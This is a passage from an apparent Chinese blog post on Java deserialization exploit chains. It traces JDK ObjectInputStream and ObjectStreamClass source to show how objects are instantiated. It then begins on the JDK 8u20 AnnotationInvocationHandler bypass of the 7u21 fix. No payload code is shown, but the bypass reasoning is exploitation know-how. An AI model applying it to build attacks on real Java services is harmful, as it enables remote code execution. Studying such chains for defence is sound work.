class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            descriptor = readProxyDesc(unshared);<span class="comment">//读取代理类描述信息</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            descriptor = readNonProxyDesc(unshared);<span class="comment">//读取非代理类描述信息</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (descriptor != <span class="keyword">null</span>) &#123;</span><br><span class="line">        validateDescriptor(descriptor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>readNonProxyDesc</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readNonProxyDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line">        <span class="keyword">int</span> descHandle = handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">        passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">        ObjectStreamClass readDesc = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            readDesc = readClassDescriptor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cl = <span class="keyword">null</span>;</span><br><span class="line">        ClassNotFoundException resolveEx = <span class="keyword">null</span>;</span><br><span class="line">        bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">boolean</span> checksRequired = isCustomSubclass();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                resolveEx = <span class="keyword">new</span> ClassNotFoundException(<span class="string">"null class"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">                ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            resolveEx = ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Call filterCheck on the class before reading anything else</span></span><br><span class="line">        filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        skipCustomData();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            totalObjectRefs++;</span><br><span class="line">            depth++;</span><br><span class="line">            desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>));<span class="comment">//初始化非代理类描述对象</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            depth--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        handles.finish(descHandle);</span><br><span class="line">        passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续看<code>initNonProxy</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initNonProxy</span><span class="params">(ObjectStreamClass model,</span></span></span><br><span class="line"><span class="function"><span class="params">                      Class&lt;?&gt; cl,</span></span></span><br><span class="line"><span class="function"><span class="params">                      ClassNotFoundException resolveEx,</span></span></span><br><span class="line"><span class="function"><span class="params">                      ObjectStreamClass superDesc)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InvalidClassException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> suid = Long.valueOf(model.getSerialVersionUID());</span><br><span class="line">        ObjectStreamClass osc = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            osc = lookup(cl, <span class="keyword">true</span>);  <span class="comment">//查找并返回非代理类描述对象</span></span><br><span class="line">...</span><br><span class="line">            <span class="keyword">if</span> (!model.isEnum) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((model.serializable == osc.serializable) &amp;&amp;</span><br><span class="line">                        (model.externalizable != osc.externalizable)) &#123;<span class="comment">//一个类不能同时实现serializable和externalizable</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(osc.name,</span><br><span class="line">                            <span class="string">"Serializable incompatible with Externalizable"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((model.serializable != osc.serializable) ||</span><br><span class="line">                        (model.externalizable != osc.externalizable) ||</span><br><span class="line">                        !(model.serializable || model.externalizable)) &#123;<span class="comment">//如果一个类既没实现serializable，也没实现externalizable，则给该类的描述对象的成员变量deserializeEx赋值，该值不为空则标志该类不能反序列化</span></span><br><span class="line">                    deserializeEx = <span class="keyword">new</span> ExceptionInfo(</span><br><span class="line">                            osc.name, <span class="string">"class invalid for deserialization"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.cl = cl;</span><br><span class="line">        <span class="keyword">this</span>.resolveEx = resolveEx;</span><br><span class="line">        <span class="keyword">this</span>.superDesc = superDesc;</span><br><span class="line">        name = model.name;</span><br><span class="line">        <span class="keyword">this</span>.suid = suid;</span><br><span class="line">        isProxy = <span class="keyword">false</span>;</span><br><span class="line">        isEnum = model.isEnum;</span><br><span class="line">        serializable = model.serializable;</span><br><span class="line">        externalizable = model.externalizable;</span><br><span class="line">        hasBlockExternalData = model.hasBlockExternalData;</span><br><span class="line">        hasWriteObjectData = model.hasWriteObjectData;</span><br><span class="line">        fields = model.fields;</span><br><span class="line">        primDataSize = model.primDataSize;</span><br><span class="line">        numObjFields = model.numObjFields;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osc != <span class="keyword">null</span>) &#123;</span><br><span class="line">            localDesc = osc;</span><br><span class="line">            writeObjectMethod = localDesc.writeObjectMethod;</span><br><span class="line">            readObjectMethod = localDesc.readObjectMethod;</span><br><span class="line">            readObjectNoDataMethod = localDesc.readObjectNoDataMethod;</span><br><span class="line">            writeReplaceMethod = localDesc.writeReplaceMethod;</span><br><span class="line">            readResolveMethod = localDesc.readResolveMethod;</span><br><span class="line">            <span class="keyword">if</span> (deserializeEx == <span class="keyword">null</span>) &#123;</span><br><span class="line">                deserializeEx = localDesc.deserializeEx;</span><br><span class="line">            &#125;</span><br><span class="line">            domains = localDesc.domains;</span><br><span class="line">            cons = localDesc.cons;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fieldRefl = getReflector(fields, localDesc);</span><br><span class="line">        <span class="comment">// reassign to matched fields so as to reflect local unshared settings</span></span><br><span class="line">        fields = fieldRefl.getFields();</span><br><span class="line">        initialized = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续看<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectStreamClass <span class="title">lookup</span><span class="params">(Class&lt;?&gt; cl, <span class="keyword">boolean</span> all)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(all || Serializable<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>))) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    processQueue(Caches.localDescsQueue, Caches.localDescs);</span><br><span class="line">    WeakClassKey key = <span class="keyword">new</span> WeakClassKey(cl, Caches.localDescsQueue);</span><br><span class="line">    Reference&lt;?&gt; ref = Caches.localDescs.get(key);</span><br><span class="line">    Object entry = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">        entry = ref.get();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (entry == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            entry = <span class="keyword">new</span> ObjectStreamClass(cl); <span class="comment">//1.实例化类描述对象</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            entry = th;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (future.set(entry)) &#123;</span><br><span class="line">            Caches.localDescs.put(key, <span class="keyword">new</span> SoftReference&lt;Object&gt;(entry));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// nested lookup call already set future</span></span><br><span class="line">            entry = future.get();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        <span class="keyword">return</span> (ObjectStreamClass) entry;     <span class="comment">//2.返回类描述对象</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (RuntimeException) entry;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (Error) entry;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(<span class="string">"unexpected entry: "</span> + entry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>ObjectStreamClass()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">ObjectStreamClass</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cl = cl;</span><br><span class="line">        name = cl.getName();</span><br><span class="line">        isProxy = Proxy.isProxyClass(cl);</span><br><span class="line">        isEnum = Enum<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>)</span>;</span><br><span class="line">        serializable = Serializable<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>)</span>;</span><br><span class="line">        externalizable = Externalizable<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; superCl = cl.getSuperclass();</span><br><span class="line">        superDesc = (superCl != <span class="keyword">null</span>) ? lookup(superCl, <span class="keyword">false</span>) : <span class="keyword">null</span>;</span><br><span class="line">        localDesc = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (serializable) &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                  ...</span><br><span class="line">                    <span class="keyword">if</span> (externalizable) &#123;</span><br><span class="line">                        cons = getExternalizableConstructor(cl);<span class="comment">//获取Externalizable方式的构造器</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cons = getSerializableConstructor(cl);  <span class="comment">//获取Serilizable机制的构造器</span></span><br><span class="line">                        writeObjectMethod = getPrivateMethod(cl, <span class="string">"writeObject"</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectOutputStream<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                            <span class="title">Void</span>.<span class="title">TYPE</span>)</span>;</span><br><span class="line">                        readObjectMethod = getPrivateMethod(cl, <span class="string">"readObject"</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectInputStream<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                            <span class="title">Void</span>.<span class="title">TYPE</span>)</span>;</span><br><span class="line">                        readObjectNoDataMethod = getPrivateMethod(</span><br><span class="line">                            cl, <span class="string">"readObjectNoData"</span>, <span class="keyword">null</span>, Void.TYPE);</span><br><span class="line">                        hasWriteObjectData = (writeObjectMethod != <span class="keyword">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    domains = getProtectionDomains(cons, cl);</span><br><span class="line">                    writeReplaceMethod = getInheritableMethod(</span><br><span class="line">                        cl, <span class="string">"writeReplace"</span>, <span class="keyword">null</span>, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    readResolveMethod = getInheritableMethod(</span><br><span class="line">                        cl, <span class="string">"readResolve"</span>, <span class="keyword">null</span>, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入<code>getSerializableConstructor()</code>方法中:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Constructor&lt;?&gt; getSerializableConstructor(Class&lt;?&gt; cl) &#123;</span><br><span class="line">        Class&lt;?&gt; initCl = cl;</span><br><span class="line">        <span class="keyword">while</span> (Serializable<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">initCl</span>)) </span>&#123;</span><br><span class="line">            Class&lt;?&gt; prev = initCl;</span><br><span class="line">            <span class="comment">//1.自底向上查找反序列化类的父类中第一个没有继承Serializable的类</span></span><br><span class="line">            <span class="keyword">if</span> ((initCl = initCl.getSuperclass()) == <span class="keyword">null</span> ||</span><br><span class="line">                (!disableSerialConstructorChecks &amp;&amp; !superHasAccessibleConstructor(prev))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//2.获取父类中第一个没有继承Serializable的类的无参构造器，如果父类没有无参构造器则抛异常</span></span><br><span class="line">            Constructor&lt;?&gt; cons = initCl.getDeclaredConstructor((Class&lt;?&gt;[]) <span class="keyword">null</span>);  </span><br><span class="line">            <span class="keyword">int</span> mods = cons.getModifiers();</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) != <span class="number">0</span> ||</span><br><span class="line">                ((mods &amp; (Modifier.PUBLIC | Modifier.PROTECTED)) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                 !packageEquals(cl, initCl)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">//3.基于父类中第一个没有继承Serializable的类的构造器产生一个新的构造器</span></span><br><span class="line">            cons = reflFactory.newConstructorForSerialization(cl, cons);</span><br><span class="line">            cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> cons;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;<span class="comment">//父类没有无参构造器则返回null，最终会导致类实例化失败</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重点在第三步：</p><p>newConstructorForSerialization：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20211110171728143.png" alt="image-20211110171728143"></p><p>发现调用generateSerializationConstructor：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20211110171907153.png" alt="image-20211110171907153"></p><p>继续generate：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20211110171958806.png" alt="image-20211110171958806" style="zoom:50%;"><p>降维打击，扑面而来的ASM气息。</p><p>简单来说，父类的无参构造器作为入参，重新创建一个包含该构造器的新构造器并返回，<strong>这个新构造器就是后续的cons</strong>。</p><p>这个新构造器一旦cons.newInstance()，不需要执行当前类(子类)的构造函数就可以进行当前类(子类)对象的创建，核心原理是反射。</p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>进入第三句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a new instance of the represented class.  If the class is</span></span><br><span class="line"><span class="comment">     * externalizable, invokes its public no-arg constructor; otherwise, if the</span></span><br><span class="line"><span class="comment">     * class is serializable, invokes the no-arg constructor of the first</span></span><br><span class="line"><span class="comment">     * non-serializable superclass.  Throws UnsupportedOperationException if</span></span><br><span class="line"><span class="comment">     * this class descriptor is not associated with a class, if the associated</span></span><br><span class="line"><span class="comment">     * class is non-serializable or if the appropriate no-arg constructor is</span></span><br><span class="line"><span class="comment">     * inaccessible/unavailable.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function">Object <span class="title">newInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InstantiationException, InvocationTargetException,</span></span><br><span class="line"><span class="function">               UnsupportedOperationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        requireInitialized();</span><br><span class="line">        <span class="keyword">if</span> (cons != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (domains == <span class="keyword">null</span> || domains.length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> cons.newInstance();<span class="comment">//调用构造器实例化对象</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    JavaSecurityAccess jsa = SharedSecrets.getJavaSecurityAccess();</span><br><span class="line">                    PrivilegedAction&lt;?&gt; pea = () -&gt; &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> cons.newInstance();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InstantiationException</span><br><span class="line">                                 | InvocationTargetException</span><br><span class="line">                                 | IllegalAccessException x) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(x);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;; <span class="comment">// Can't use PrivilegedExceptionAction with jsa</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> jsa.doIntersectionPrivilege(pea,</span><br><span class="line">                                   AccessController.getContext(),</span><br><span class="line">                                   <span class="keyword">new</span> AccessControlContext(domains));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UndeclaredThrowableException x) &#123;</span><br><span class="line">                        Throwable cause = x.getCause();</span><br><span class="line">                        <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> InstantiationException)</span><br><span class="line">                            <span class="keyword">throw</span> (InstantiationException) cause;</span><br><span class="line">                        <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> InvocationTargetException)</span><br><span class="line">                            <span class="keyword">throw</span> (InvocationTargetException) cause;</span><br><span class="line">                        <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> IllegalAccessException)</span><br><span class="line">                            <span class="keyword">throw</span> (IllegalAccessException) cause;</span><br><span class="line">                        <span class="comment">// not supposed to happen</span></span><br><span class="line">                        <span class="keyword">throw</span> x;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">                <span class="comment">// should not occur, as access checks have been suppressed</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//反序列化失败</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关于<code>cons.newInstance();</code>：</p><p>如果反序列化类实现了Externalizable接口，则这里调用的就是权限为public的无参构造函数；</p><p>如果反序列化类实现了Serializable接口，则这里调用的就是第一个没有实现serializable接口的父类的无参构造器。</p><p>因此，如果Serializable，反序列化对象，不会调用其构造函数，但会调用其父对象的默认无参构造函数。</p><p>参考：</p><p><a href="https://www.cnblogs.com/kendoziyu/p/how-create-java-bean-when-java-serialization.html" target="_blank" rel="noopener">Java反序列化时是否通过默认构造函数创建对象？</a></p><p><a href="https://java-questions.com/Serialization-interview-questions.html" target="_blank" rel="noopener">Java Serialization interview questions</a></p><p><a href="https://www.cnblogs.com/strongmore/p/15470175.html" target="_blank" rel="noopener">java魔法类之ReflectionFactory介绍</a></p><p><a href="https://www.codenong.com/8141440/" target="_blank" rel="noopener">How are constructors called during serialization and deserialization?</a></p><h2 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>切回正题</p><p>这里我们先看一下8u20下AnnotationInvocationHandler类的readObject方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521174334090.png" alt="image-20210521174334090"></p><p>两步骤：</p><ul><li>先执行var1.defaultReadObject()来还原对象，从流里还原对象</li><li>检查this.type进行了是否为注解类，如果不是的话就报错</li></ul><p>注意<strong>AnnotationInvocationHandler 这个对象是先被成功还原</strong>，然后再抛出的异常。绕过就是利用了这一点。</p><p>这里compare一下<code>jdk7u21</code>的修复方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 